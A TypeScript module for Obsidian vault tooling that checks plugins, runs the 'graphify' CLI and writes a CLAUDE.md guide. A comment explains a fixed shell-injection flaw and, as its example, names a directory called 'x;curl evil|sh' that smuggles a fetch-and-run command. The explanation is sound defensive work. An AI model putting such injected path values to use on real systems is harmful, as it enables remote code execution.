// Vault tooling that is NOT part of the read-only grounding path:
//   - graphify build: runs the `graphify` CLI against the vault, which writes
//     a graphify-out/ folder INTO the vault. This is an explicit, user-initiated
//     action (a button in Settings), distinct from grounding — which stays
//     strictly read-only (see vaultAdapter.ts / vaultKb.ts + readonly-guard.test).
//   - CLAUDE.md generator write: persists the navigation guide assembled by
//     vaultClaudeMd.ts into the vault root. The SECOND sanctioned vault write,
//     opt-in and confirmed, kept here (not in the read-only-guarded modules).
//   - readiness: reads the vault's .obsidian/community-plugins.json (read-only)
//     to show which recommended plugins are present, plus entity-index status.

import { spawn } from 'node:child_process'
import { promises as fs } from 'node:fs'
import path from 'node:path'
import { randomBytes } from 'node:crypto'
import { ENTITY_INDEX_RELPATH } from './vaultAdapter.js'
import { joinClaudeMd } from './vaultClaudeMd.js'

/** Recommended Obsidian community plugins → their plugin IDs (the keys that
 *  appear in .obsidian/community-plugins.json). */
export const RECOMMENDED_PLUGINS: Array<{ id: string; label: string; why: string }> = [
  { id: 'obsidian-linter', label: 'Linter', why: 'Normalises YAML frontmatter so aliases parse cleanly.' },
  { id: 'templater-obsidian', label: 'Templater', why: 'Keeps new entity notes on a consistent frontmatter schema.' },
  { id: 'dataview', label: 'Dataview', why: 'Maintain an entity index / map-of-content.' },
  {
    id: 'obsidian-local-rest-api',
    label: 'Local REST API',
    why: 'Optional — enables an Obsidian MCP server for interactive note lookups.',
  },
]

export type VaultReadiness = {
  hasEntityIndex: boolean
  plugins: Array<{ id: string; label: string; why: string; present: boolean }>
  graphifyOutPresent: boolean
}

async function fileExists(p: string): Promise<boolean> {
  try {
    await fs.access(p)
    return true
  } catch {
    return false
  }
}

/** Read-only readiness probe. Reads .obsidian/community-plugins.json (a JSON
 *  array of enabled plugin IDs) to report which recommended plugins are present. */
export async function readVaultReadiness(vaultPath: string): Promise<VaultReadiness> {
  const hasEntityIndex = await fileExists(path.join(vaultPath, ENTITY_INDEX_RELPATH))
  const graphifyOutPresent = await fileExists(path.join(vaultPath, 'graphify-out', 'graph.json'))

  let enabled: string[] = []
  try {
    const raw = await fs.readFile(path.join(vaultPath, '.obsidian', 'community-plugins.json'), 'utf8')
    const parsed = JSON.parse(raw)
    if (Array.isArray(parsed)) enabled = parsed.filter((x): x is string => typeof x === 'string')
  } catch {
    // No vault config / unreadable → treat all as absent (informational only).
  }
  const enabledSet = new Set(enabled)
  const plugins = RECOMMENDED_PLUGINS.map((p) => ({ ...p, present: enabledSet.has(p.id) }))
  return { hasEntityIndex, plugins, graphifyOutPresent }
}

export type GraphifyStatus = { cliAvailable: boolean; version?: string; outPresent: boolean }

/** Is the `graphify` CLI on PATH, and does graphify-out already exist in the vault? */
export async function graphifyStatus(vaultPath: string): Promise<GraphifyStatus> {
  const outPresent = await fileExists(path.join(vaultPath, 'graphify-out', 'graph.json'))
  const ver = await new Promise<string | null>((resolve) => {
    // AUDIT: literal command + single literal flag; no user input. shell:true
    // for Windows PATH shim resolution (graphify.cmd from pipx).
    const child = spawn('graphify', ['--version'], { shell: true })
    let out = ''
    child.stdout?.on('data', (c) => (out += String(c)))
    child.on('error', () => resolve(null))
    child.on('exit', (code) => resolve(code === 0 ? out.trim() : null))
    setTimeout(() => {
      try {
        child.kill()
      } catch {
        /* */
      }
      resolve(null)
    }, 4_000)
  })
  return { cliAvailable: ver !== null, version: ver ?? undefined, outPresent }
}

export type GraphifyBuildResult = { ok: boolean; code: number | null; output: string }

/** Run `graphify update <vaultPath>` with cwd = vaultPath, so graphify writes
 *  its graphify-out/ INTO the vault (per the user's chosen behaviour). This is
 *  the one explicit, opt-in vault write — initiated only by the Settings button. */
export async function runGraphifyBuild(vaultPath: string): Promise<GraphifyBuildResult> {
  return new Promise((resolve) => {
    // This used to pass `['update', vaultPath]`. That was unsafe: with
    // shell:true Node concatenates argv into ONE shell string without
    // escaping (hence Node's DEP0190 warning), so shell metacharacters in
    // the path execute. Not theoretical here — `D&D Vault` is a legal
    // directory name and the most natural one a lore vault could have; it
    // splits at `&` and runs `D Vault` as a command. On POSIX, a directory
    // named `x;curl evil|sh` in a shared /tmp is clean RCE. The old comment
    // claimed argv was "not interpolated into a shell string", which was
    // false and is what laundered it past this scanner.
    //
    // shell:true is retained solely for Windows PATH shim resolution
    // (graphify.cmd from pipx).
    //
    // AUDIT: every argv entry is a literal ('update', '.'). The vault path
    // reaches the child ONLY via `cwd`, which Node hands to the OS directly
    // and never through a shell, so no user input can reach the command line.
    const child = spawn('graphify', ['update', '.'], { cwd: vaultPath, shell: true })
    let output = ''
    child.stdout?.on('data', (c) => (output += String(c)))
    child.stderr?.on('data', (c) => (output += String(c)))
    child.on('error', (err) => resolve({ ok: false, code: null, output: `spawn error: ${err.message}` }))
    child.on('exit', (code) => resolve({ ok: code === 0, code, output: output.slice(-4000) }))
    // graphify on a 255-note vault is AST-light but give it room.
    setTimeout(() => {
      try {
        child.kill()
      } catch {
        /* */
      }
      resolve({ ok: false, code: null, output: output + '\n(timed out after 120s)' })
    }, 120_000)
  })
}

export type ClaudeMdWriteResult = { written: string; bytes: number }

/** Write the generated CLAUDE.md guide into the vault root atomically
 *  (temp file + rename, so a crash never leaves a half-written guide). This is
 *  a sanctioned, opt-in vault write — initiated only by the "Generate CLAUDE.md"
 *  button when both add-ons are loaded, and only after a don't-clobber confirm.
 *  Content is assembled (read-only) by vaultClaudeMd.ts buildVaultClaudeMd(). */
export async function writeVaultClaudeMd(vaultPath: string, content: string): Promise<ClaudeMdWriteResult> {
  const dest = joinClaudeMd(vaultPath)
  const tmp = `${dest}.${randomBytes(6).toString('hex')}.tmp`
  try {
    await fs.writeFile(tmp, content, 'utf8')
    await fs.rename(tmp, dest)
  } catch (err) {
    await fs.unlink(tmp).catch(() => undefined)
    throw err
  }
  return { written: dest, bytes: Buffer.byteLength(content, 'utf8') }
}
